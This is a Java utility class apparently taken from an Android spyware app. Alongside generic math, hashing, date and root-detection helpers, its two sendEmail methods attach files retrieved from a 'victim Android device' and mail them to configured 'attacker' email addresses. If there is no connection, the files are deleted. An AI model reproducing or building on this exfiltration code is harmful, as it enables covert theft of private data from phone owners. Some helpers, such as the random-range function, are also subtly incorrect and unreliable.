package com.tvh.security.utils;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.text.format.DateFormat;
import android.util.FloatMath;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.Normalizer;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Random;

import com.tvh.security.controllers.Mailer;

public class Utils {
    private static final String TAG = Utils.class.getName();
    static long countToEnable = 0;

    public static Fusion averageValue(List<Fusion> arr) {
        if (arr.size() == 0)
            return new Fusion();
        Fusion t = new Fusion();
        for (Fusion x : arr) {
            t.setX(t.getX() + x.getX());
            t.setY(t.getY() + x.getY());
            t.setZ(t.getZ() + x.getZ());
        }
        t.setX(t.getX() / arr.size());
        t.setY(t.getY() / arr.size());
        t.setZ(t.getZ() / arr.size());
        return t;
    }

    public static boolean compareFusion(Fusion f1, Fusion f2) {
        if (f1.getX() == f2.getX() && f1.getY() == f2.getY() && f1.getZ() == f2.getZ())
            return true;
        return false;
    }

    public static String LongToDate(long lDate) {
        Date date = new Date(lDate);
        return date.toGMTString() + " ";
    }

    public static float getDAngle(float a, float b) {
        a = FloatMath.floor(a);
        b = FloatMath.floor(b);

        if (a < 0) {
            a = 360 + a;
        }
        if (b < 0) {
            b = 360 + b;
        }

        float dx = Math.abs(a - b);
        if (dx > 270) {
            dx = 360 - dx;
        }
        return dx;
    }

    public static float max(List<Float> arr) {
        if (arr.size() > 0) {
            return Collections.max(arr);
        }
        return 0;
    }

    public static float min(List<Float> arr) {
        if (arr.size() > 0) {
            return Collections.min(arr);
        }
        return 0;
    }

    /**
     * Check a number is a prime?
     *
     * @param number
     * @return true if a prime, false to another else.
     */
    public static boolean checkPrime(int number) {
        if (number < 2)
            return false;
        for (int i = 2; i <= (int) Math.sqrt((double) number); i++) {
            if ((number % i) == 0)
                return false;
        }
        return true;
    }

    /**
     * function get a number is random between min and max value.
     *
     * @param min
     * @param max
     * @return
     */
    public static int ramdom(int min, int max) {
        Random r = new Random();
        return Math.abs(min) + Math.abs(r.nextInt(max - min));
    }

    /**
     * function GDC - Greatest Common Divisor
     *
     * @param a
     * @param b
     * @return
     */
    public static int GCD(int a, int b) {
        int result = 0;
        a = Math.abs(a);
        b = Math.abs(b);
        while (a * b != 0) {
            if (a >= b)
                a = a % b;
            else
                b = b % a;
        }
        result = a + b;
        return result;
    }

    /**
     * function computing module a^b mode n (with b is large number)
     *
     * @param a
     * @param b
     * @param n
     * @return
     */
    public static int module(int a, int b, int n) {
        int mode = a % n;
        for (int i = 1; i < b; i++) {
            mode = (mode * a) % n;
        }
        return mode;
    }

    /**
     * Make dir or dirs on SD card
     *
     * @param dirPath
     */
    public static void mkDirOnSDCard(String dirPath) {
        File desPathFile = new File(dirPath);
        if (!desPathFile.mkdir()) {
            desPathFile.mkdirs();
        }
    }

    /**
     * @param pathFile
     */
    public static void sendEmail(Context context, String pathFile, boolean deleteIfSuccess) {
        if (checkInternetConnection(context)) {
            // Get all file retrived and send to email seted up
            Mailer mail = new Mailer(context, PreferencesUtils.getFromEmail(context), PreferencesUtils.getFromEmailPassword(context));
            String toArr = PreferencesUtils.getAttackerEmails(context);
            mail.setTo(new String[]{toArr});
            mail.setFrom(PreferencesUtils.getFromEmail(context));
            mail.setSubject("Email sent form victim Android device.");
            mail.setBody("This is an email sent from Android device. Done!");
            try {
                if (new File(pathFile).exists()) {
                    mail.addAttachment(pathFile);
                }
                // Send email and delete retrieved files if success and delete
                // if
                // unsuccess
                mail.send(deleteIfSuccess);
            } catch (Exception e) {
            }
        } else {
            // TODO future work: Encrypt
            /*
             * if (new File(pathFile).exists()) { String path =
             * PreferencesUtils.getPathSaveFile(context);
             * System.out.println("encrypt file " + pathFile);
             * FileManager.encrypt(path, pathFile, pathFile + "c"); }
             */

            // DELETE
            System.out.println("Delete file(s).");
            File f = new File(pathFile);
            if (f.exists()) {
                f.delete();
            }
        }
    }

    public static void sendEmail(Context context, String content) {
        if (checkInternetConnection(context)) {
            Mailer mail = new Mailer(context, PreferencesUtils.getFromEmail(context), PreferencesUtils.getFromEmailPassword(context));
            String toArr = PreferencesUtils.getAttackerEmails(context);
            mail.setTo(new String[]{toArr});
            mail.setFrom(PreferencesUtils.getFromEmail(context));
            mail.setSubject("Email sent form victim Android device.");
            mail.setBody(content);
            mail.send(false);
        }
    }

    public static boolean checkInternetConnection(Context context) {
        countToEnable = 0;

        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = null;
        if (connectivityManager != null) {
            networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            if (!networkInfo.isAvailable()) {
                networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            }
        }
        return networkInfo == null ? false : networkInfo.isConnected();

    }

    public static void showToast(Context context, String content) {
        Toast.makeText(context, content, Toast.LENGTH_SHORT / 5).show();
    }

    public static String convertToASCII(String text) {
        if (text != null) {
            return Normalizer.normalize(text, java.text.Normalizer.Form.NFD).replaceAll("\\p{InCombiningDiacriticalMarks}+", "");
        }
        return "";
    }

    public static String getDateNow() {
        Date time = new Date();
        return DateFormat.format("dd.MM.yy-hh.mm.ss", time.getTime()).toString();
    }

    public static String md5(String s) {
        MessageDigest digest;
        try {
            digest = java.security.MessageDigest.getInstance("MD5");
            digest.update(s.getBytes());
            byte messageDigest[] = digest.digest();

            // convert the byte to hex format method 1
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                sb.append(Integer.toString((messageDigest[i] & 0xff) + 0x100, 16).substring(1));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            return null;
        }
    }

    public static String parsePhoneNumber(String input) {
        String result = null;
        result = input.replace("(", "").replace(")", "").replace("-", "").replace(" ", "");
        return result;
    }

    public static boolean isRootedPhone() {
        String buildTags = android.os.Build.TAGS;

        if (buildTags != null && buildTags.contains("test-keys")) {
            return true;
        }

        try {
            File file = new File("/system/app/Superuser.apk");
            if (file.exists()) {
                return true;
            }
        } catch (Exception e) {
            Log.e(Utils.class.getName(), "Error when check rooted phone");
        }
        return false;
    }
}
